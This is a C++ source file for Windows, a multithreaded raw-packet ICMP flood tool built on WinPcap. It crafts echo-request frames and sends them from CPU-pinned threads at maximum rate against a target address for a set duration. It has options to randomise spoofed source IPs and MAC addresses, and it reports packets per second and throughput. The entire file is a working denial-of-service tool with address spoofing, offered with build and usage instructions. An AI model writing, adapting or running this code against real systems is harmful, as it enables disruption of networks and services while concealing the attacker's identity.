// g++ -O2 -g icmp.cpp -o icmp.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <thread>
#include <atomic>
#include <memory>
#include <vector>
#include <chrono>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#pragma pack(push, 1)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};
struct ipv4_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};
struct icmpv4_header {
    uint8_t  type;
    uint8_t  code;
    uint16_t check;
    uint16_t id;
    uint16_t seq;
};
#pragma pack(pop)

// ------------------------------------------------------------
// Utility functions (same as in ARP)
// ------------------------------------------------------------
bool get_local_mac_ipv4(uint32_t ip, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                IP_ADDR_STRING* pIp = &pAdapter->IpAddressList;
                while (pIp) {
                    if (inet_addr(pIp->IpAddress.String) == ip) {
                        memcpy(mac, pAdapter->Address, 6);
                        free(pAdapterInfo);
                        return true;
                    }
                    pIp = pIp->Next;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    return false;
}

std::string get_interface_name_ipv4(uint32_t ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) return "";
    for (dev = alldevs; dev; dev = dev->next) {
        for (pcap_addr_t *addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)addr->addr;
                if (sin->sin_addr.s_addr == ip) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

uint16_t checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

bool parse_mac_strict(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n", &tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5],&consumed) != 6) return false;
    if (str[consumed] != '\0') return false;
    for (int i = 0; i < 6; ++i) mac[i] = static_cast<uint8_t>(tmp[i]);
    return true;
}

void print_mac(const uint8_t mac[6]) {
    for (int i = 0; i < 6; ++i) { if (i) printf(":"); printf("%02X", mac[i]); }
    printf("\n");
}

// ------------------------------------------------------------
// Prebuilt ICMP packet
// ------------------------------------------------------------
class PrebuiltPacketICMP {
public:
    static constexpr size_t MIN_SIZE = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(icmpv4_header);
    alignas(64) uint8_t buffer[1518];
    size_t size;
    size_t src_mac_offset;
    size_t src_ip_offset;
    size_t icmp_id_offset;
    size_t icmp_seq_offset;
    uint32_t src_ip;
    uint32_t dst_ip;
    size_t payload_size;

    PrebuiltPacketICMP(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac, size_t packet_size)
        : src_ip(src_ip), dst_ip(dst_ip)
    {
        size_t min = MIN_SIZE;
        payload_size = (packet_size > min) ? (packet_size - min) : 0;
        size = min + payload_size;
        memset(buffer, 0, size);

        ether_header* eth = (ether_header*)buffer;
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(0x0800);

        ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
        ip->version = 4; ip->ihl = 5; ip->tos = 0;
        ip->tot_len = htons(sizeof(ipv4_header) + sizeof(icmpv4_header) + payload_size);
        ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = 1; ip->check = 0;
        ip->saddr = src_ip; ip->daddr = dst_ip;

        icmpv4_header* icmp = (icmpv4_header*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
        icmp->type = 8; icmp->code = 0; icmp->check = 0; icmp->id = 0; icmp->seq = 0;

        if (payload_size) {
            uint8_t* payload = buffer + sizeof(ether_header) + sizeof(ipv4_header) + sizeof(icmpv4_header);
            memset(payload, 0, payload_size);
        }

        src_mac_offset = offsetof(ether_header, ether_shost);
        src_ip_offset = sizeof(ether_header) + offsetof(ipv4_header, saddr);
        icmp_id_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(icmpv4_header, id);
        icmp_seq_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(icmpv4_header, seq);
    }

    void set_src_mac(const uint8_t mac[6]) { memcpy(buffer + src_mac_offset, mac, 6); }
    void set_src_ip(uint32_t ip) { src_ip = ip; *(uint32_t*)(buffer + src_ip_offset) = ip; }
    void set_icmp_id(uint16_t id) { *(uint16_t*)(buffer + icmp_id_offset) = htons(id); }
    void set_icmp_seq(uint16_t seq) { *(uint16_t*)(buffer + icmp_seq_offset) = htons(seq); }

    void recalc_checksum() {
        ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
        ip->check = 0;
        ip->check = checksum((uint16_t*)ip, sizeof(ipv4_header));

        icmpv4_header* icmp = (icmpv4_header*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
        icmp->check = 0;
        size_t icmp_len = sizeof(icmpv4_header) + payload_size;
        uint8_t* stack_buf = (uint8_t*)_alloca(icmp_len);
        memcpy(stack_buf, icmp, icmp_len);
        icmp->check = checksum((uint16_t*)stack_buf, (int)icmp_len);
    }
};

// ------------------------------------------------------------
// Flood engine
// ------------------------------------------------------------
class FloodEngineICMP {
    pcap_t* pcap_handle;
    PrebuiltPacketICMP packet;
    std::atomic<uint64_t>& total;
    std::atomic<bool>& stop;
    uint16_t icmp_counter;
    bool random_ip, random_mac;
    uint32_t seed;
    inline uint32_t lcg() { seed = seed * 1664525 + 1013904223; return seed; }

public:
    FloodEngineICMP(pcap_t* handle, uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac,
                    int tid, std::atomic<uint64_t>& t, std::atomic<bool>& s, bool rip, bool rmac, size_t pkt_size)
        : pcap_handle(handle), packet(src_ip, src_mac, dst_ip, dst_mac, pkt_size), total(t), stop(s),
          icmp_counter(tid * 1000), random_ip(rip), random_mac(rmac), seed(time(nullptr) + tid * 123456789) {}

    void start(int core) {
        SetThreadAffinityMask(GetCurrentThread(), 1ULL << core);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
        int iter = 0;
        while (true) {
            if (++iter >= 1024) {
                if (stop.load(std::memory_order_relaxed)) break;
                iter = 0;
            }
            if (random_ip) {
                uint32_t rip = lcg();
                rip &= 0xFEFFFFFF;
                packet.set_src_ip(rip);
            }
            if (random_mac) {
                uint8_t mac[6];
                uint64_t r = lcg(); r = (r << 32) | lcg();
                memcpy(mac, &r, 6);
                mac[0] &= 0xFE;
                packet.set_src_mac(mac);
            }
            uint16_t id = icmp_counter++;
            packet.set_icmp_id(id);
            packet.set_icmp_seq(id);
            packet.recalc_checksum();
            if (pcap_sendpacket(pcap_handle, packet.buffer, (int)packet.size) == 0)
                total.fetch_add(1, std::memory_order_relaxed);
        }
    }
};

// ------------------------------------------------------------
// main
// ------------------------------------------------------------
int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: icmp.exe <src_ip> <dst_ip> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac] [--packet-size <bytes>]\n";
        return 1;
    }
    uint32_t src_ip = inet_addr(argv[1]);
    uint32_t dst_ip = inet_addr(argv[2]);
    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);

    uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool random_ip = false, random_mac = false;
    size_t pkt_size = 0;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
        else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
        else if (strcmp(argv[i], "--packet-size") == 0 && i+1 < argc) pkt_size = atoi(argv[++i]);
        else parse_mac_strict(argv[i], dst_mac);
    }
    if (pkt_size < PrebuiltPacketICMP::MIN_SIZE) pkt_size = PrebuiltPacketICMP::MIN_SIZE;

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_init(PCAP_CHAR_ENC_UTF_8, errbuf);

    std::string ifname = get_interface_name_ipv4(src_ip);
    if (ifname.empty()) { std::cerr << "Interface not found\n"; return 1; }
    uint8_t src_mac[6] = {0};
    if (!random_mac && !get_local_mac_ipv4(src_ip, src_mac)) { std::cerr << "Cannot get local MAC\n"; return 1; }

    pcap_t* temp = pcap_open(ifname.c_str(), 65536, 0, 1000, nullptr, errbuf);
    if (!temp || pcap_datalink(temp) != DLT_EN10MB) { std::cerr << "Link error\n"; return 1; }
    pcap_close(temp);

    std::vector<pcap_t*> handles;
    for (int i = 0; i < threads; i++) {
        pcap_t* h = pcap_open(ifname.c_str(), 65536, 0, 1000, nullptr, errbuf);
        if (!h) { for (auto hh : handles) pcap_close(hh); return 1; }
        handles.push_back(h);
    }

    std::atomic<uint64_t> total(0);
    std::atomic<bool> stop(false);
    std::vector<std::thread> workers;
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD cores = si.dwNumberOfProcessors;

    auto start = std::chrono::steady_clock::now();
    for (int i = 0; i < threads; i++) {
        auto eng = std::make_unique<FloodEngineICMP>(handles[i], src_ip, src_mac, dst_ip, dst_mac, i, total, stop, random_ip, random_mac, pkt_size);
        workers.emplace_back(&FloodEngineICMP::start, eng.get(), i % cores);
        eng.release();
    }

    if (duration > 0) std::this_thread::sleep_for(std::chrono::seconds(duration));
    else { std::cout << "Press Enter...\n"; std::cin.get(); }
    stop = true;
    for (auto& w : workers) w.join();

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
    uint64_t pkts = total.load();
    double pps = pkts * 1000.0 / elapsed;
    double mbps = pps * pkt_size * 8 / 1e6;
    std::cout << "Packets: " << pkts << "\nPPS: " << pps << "\nMbps: " << mbps << "\n";
    for (auto h : handles) pcap_close(h);
    return 0;
}